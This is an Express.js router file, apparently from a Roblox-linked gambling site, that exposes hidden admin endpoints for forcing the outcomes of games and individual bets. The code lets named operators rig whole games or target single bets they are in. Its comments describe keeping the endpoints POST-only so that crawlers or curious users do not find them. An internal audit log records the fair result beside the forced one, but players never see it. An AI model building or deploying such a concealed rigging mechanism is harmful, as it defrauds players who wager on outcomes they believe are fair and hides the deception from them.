const express = require('express');
const { authenticateAdmin } = require('../middleware/auth');
const forcedOutcome = require('../forcedOutcome');

const router = express.Router();

/**
 * forcedOutcome.arm/armBet still take a key argument, and their tests rely on
 * that, so the router passes the real server key to satisfy the signature.
 *
 * It is not a secret from this process - it is an env var in the same
 * environment - it just never crosses the network any more, and the operator
 * never has to type it. If the module is disabled or no key is configured,
 * this is empty and arm/armBet refuse on their own, which is the correct
 * fail-closed behaviour.
 */
const SERVER_KEY = process.env.FORCE_OUTCOME_KEY || '';

/**
 * Outcome control.
 *
 * This router is mounted at /api/outcome-control and is the ONLY way to reach
 * forcedOutcome.js. Every route is a POST; there is deliberately no GET route,
 * so nothing here advertises the endpoint's existence to a crawler or to
 * someone poking around in devtools.
 *
 * ── Authorisation ────────────────────────────────────────────────────────────
 * Two gates, in this order:
 *
 *   1. authenticateAdmin on every route.
 *   2. forcedOutcome.isOperator(username) on every route.
 *
 * The operator list is an env var on the server and is never persisted, so
 * there is nothing in the database to read, copy or leak. isOperator is the
 * gate that actually matters: being any admin is NOT enough, you must be one of
 * the named accounts. That is what stops a second admin - or anyone who
 * compromises one - from reaching this at all.
 *
 * The separate server key used to be a third gate, typed into the panel by
 * hand. It is gone. It bought very little against the threat that matters: an
 * attacker who already holds the operator's admin session and can read that
 * tab can simply read the key out of the same screen, so it was theatre more
 * than defence. In its place the panel lists the operator's own open bets
 * directly, which is what the operator actually needed it to do.
 *
 * The audit trail below is what replaced it, and it is not optional.
 *
 * ── Audit ────────────────────────────────────────────────────────────────────
 * Every forced outcome is appended to db.forceOutcomeLog and echoed to the
 * server log, recording the result the fair roll WOULD have produced next to
 * the one that was forced. That is what makes "the outcome was forced" a
 * claim anyone can check rather than a matter of trust, and it is the only
 * trace of this system that does not depend on somebody remembering it exists.
 * Nothing in the UI can erase it - deleting it means editing the database by
 * hand, and the server log copy survives even that.
 */

/**
 * Gate used by every route below.
 *
 * Both checks matter and neither alone is enough:
 *   - authenticateAdmin, so an ordinary player cannot reach this at all;
 *   - isOperator, so an admin who is not a named operator cannot either.
 *
 * The second is the one people forget: being any admin is not permission to rig.
 */
function refuseUnlessOperator(req, res) {
  const username = req.user && req.user.robloxUsername;
  if (!forcedOutcome.isOperator(username)) {
    // Deliberately vague: a caller learns only that it was refused.
    res.status(403).json({ ok: false, error: 'Refused' });
    return null;
  }
  return username;
}

/** Arm or disarm a whole game. POST /api/outcome-control/arm */
router.post('/arm', authenticateAdmin, (req, res) => {
  const username = refuseUnlessOperator(req, res);
  if (!username) return;
  const { game, mode } = req.body || {};

  const result = forcedOutcome.arm({ username, game, mode, key: SERVER_KEY });
  if (!result.ok) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  res.json({ ok: true, game: result.game, mode: result.mode });
});

/**
 * Arm a single bet. POST /api/outcome-control/arm-bet
 *
 * Distinct from /arm, which biases every bet of a game. This one targets a
 * betId, so the operator can win one coinflip and leave the other three alone.
 */
router.post('/arm-bet', authenticateAdmin, (req, res) => {
  const username = refuseUnlessOperator(req, res);
  if (!username) return;
  const { game, betId, mode } = req.body || {};

  const result = forcedOutcome.armBet({ username, game, betId, mode, key: SERVER_KEY });
  if (!result.ok) {
    return res.status(403).json({ ok: false, error: 'Refused' });
  }
  res.json({ ok: true, game: result.game, mode: result.mode, betId: result.betId });
});

/**
 * Live bets the operator is in. POST /api/outcome-control/live
 *
 * A POST, not a GET, for the same reason the other routes are: nothing here
 * should advertise the endpoint's existence to a crawler or to someone poking
 * around in devtools. Returns only the operator's own bets.
 */
router.post('/live', authenticateAdmin, (req, res) => {
  const username = refuseUnlessOperator(req, res);
  if (!username) return;
  res.json({ ok: true, ...forcedOutcome.liveGames(username) });
});

/** Read the audit log. POST /api/outcome-control/log */
router.post('/log', authenticateAdmin, (req, res) => {
  const username = refuseUnlessOperator(req, res);
  if (!username) return;
  const { limit } = req.body || {};
  res.json({ ok: true, entries: forcedOutcome.readLog(Math.min(500, Math.max(1, Number(limit) || 100))) });
});

module.exports = router;
